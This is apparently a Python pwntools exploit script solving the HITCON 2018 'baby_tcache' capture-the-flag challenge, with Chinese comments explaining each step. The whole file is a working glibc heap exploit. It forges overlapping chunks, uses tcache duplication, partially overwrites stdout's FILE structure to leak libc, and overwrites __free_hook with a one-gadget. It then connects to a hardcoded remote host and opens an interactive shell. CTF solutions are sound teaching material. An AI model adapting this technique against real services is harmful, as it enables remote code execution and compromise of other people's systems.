#!/usr/bin/env python2
# coding: utf-8
# Usage: ./exploit.py -r/-l/-d

from pwn import *
import argparse
import itertools
import time

IP = "52.68.236.186"
PORT = 56746
# IP = "192.168.33.1"
# PORT = 9999

one_gg = 0x4f322

context.arch = "amd64"
context.log_level = 'DEBUG'
context.log_level = 'critical'
context.terminal = ['tmux', 'splitw', '-h']
BIN = "./baby_tcache"


def lg(s, addr):
    print('\033[1;31;40m%20s-->0x%x\033[0m' % (s, addr))

def r(x): return io.recv(x)
def ru(x): return io.recvuntil(x)
def rud(x): return io.recvuntil(x, drop=True)
def se(x): return io.send(x)
def sel(x): return io.sendline(x)
def pick32(x): return u32(x[:4].ljust(4, '\0'))
def pick64(x): return u64(x[:8].ljust(8, '\0'))


parser = argparse.ArgumentParser()

parser.add_argument('-d', '--debugger', action='store_true')
parser.add_argument('-r', '--remote', action='store_true')
parser.add_argument('-l', '--local', action='store_true')
args = parser.parse_args()


io = None  # this is global process variable

binary = ELF(BIN)

if args.remote:
    io = remote(IP, PORT)  
elif args.local or args.debugger:
    # env = {"LD_PRELOAD": os.path.join(os.getcwd(), "libc.so.6")}
    env = {}
    io = process(BIN,  env=env)
    proc_base = io.libs()[
        "/home/vagrant/DongFeng/HITCON2018/pwn/baby_tcache/baby_tcache/baby_tcache"]
    libc_bb = io.libs()[
        '/lib/x86_64-linux-gnu/libc.so.6']
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
else:
    parser.print_help()
    exit()

def new_heap(size, payload):
    rud("Your choice: ")
    sel(str(1))
    rud("Size:")
    sel(str(size))
    rud("Data:")
    se(payload)

def delete_heap(index):
    rud("Your choice: ")
    sel(str(2))
    rud("Index:")
    sel(str(index))


one_gg = 0x4f322


# forgotten chunk overlap
new_heap(0x4f0-0x50, "A"*0x10) # 0
new_heap(0x30, "A"*0x10) # 1
new_heap(0x20, "A"*0x10) # 2
new_heap(0x20, "A"*0x10) # 3
new_heap(0x4f0, "A"*0x10) # 4
delete_heap(0) 
delete_heap(3) 

# 覆盖第二个unsortbin chunk的prev.size的值变大，使得中间三个tcache的chunk被忽略
payload = "1"*32 + p64(0x500 + 0x60+0x40 - 0x50)
new_heap(0x28, payload)  # 0 
delete_heap(4) 

# 申请堆，使得新申请的0x30和0x20大小的堆与原来被遗忘的堆，重叠.
# 再利用tcache dup attack，使得两个tcache的fd指向自身
new_heap(0x4f0-0x50, "B"*0x10)
new_heap(0x30, "A"*0x10) # 1
new_heap(0x20, "A"*0x10) # 2
delete_heap(1)
delete_heap(4)
delete_heap(2)
delete_heap(5)

#　申请一个unsortbin，中间夹个0x40的东西，再释放这个unsortbin，使得它的fd和bd在堆上留存
new_heap(0x4f0, "\n") # 1
new_heap(0x40, "\n")
delete_heap(1)

# 随便申请任意一个0x400大小以下的堆，他会从刚才释放的unsortbin开始，
# 这里我们覆盖尾数为IO_file_stdout，用于puts时泄露libc内的内容，从而泄露libc
#604760
payload = p16(0x4760) # IO_file_stdout
new_heap(0x40, payload)

# 利用第一个0x30的tcache，使得其指向内存中任意位置，从而获得IO_file_stdout开头的tcache块
payload = "\x80"
new_heap(0x30, payload)
new_heap(0x30, payload)
new_heap(0x30, payload)

if args.debugger:
    gdb.attach(io, '''
    b *0x{:x}
    b *0x{:x}
    b *0x{:x}
    c
    p/x &__free_hook
    p/x 0x{:x} + 0x4f322
    '''.format(
        proc_base + 0x0000000000000CE2,  # malloc
        proc_base + 0x0000000000000E3A,  # free
        libc_bb + one_gg, # one gadget
        libc_bb
        )
    )

# 覆盖重写IO_file_stdout，stdout会从打印_IO_stdfile_2_lock的值
payload = p64(0xfbad3c80) + p64(0)*3 + "\x08"
new_heap(0x30, payload)

libc_base = pick64(io.read(8)) - 0x3ed8b0
lg("libc base address", libc_base)

#　删除一堆无用的堆，因为限定了只能申请10个
delete_heap(4)
delete_heap(0)
delete_heap(2)
delete_heap(1)
delete_heap(6)

#58e8
# 获得free_hook的tcache堆，利用0x20大小的tcache块
payload = p16(0x58e8)
new_heap(0x4a0, payload)

payload = "\xd0"
new_heap(0x20, payload)
new_heap(0x20, "\n")
new_heap(0x20, "\n")

# 这里覆盖free_hook为one_gadget，因为system不好用，本身会被覆盖为一堆0xda的东西
payload = p64(libc_base + one_gg)
new_heap(0x20, payload)

delete_heap(0)

try:
    io.sendline("cat flag")
    resp = io.recv(4, timeout=2)
    print resp
    io.interactive()
except:
    io.close()

# ------------------------------end-------------------------
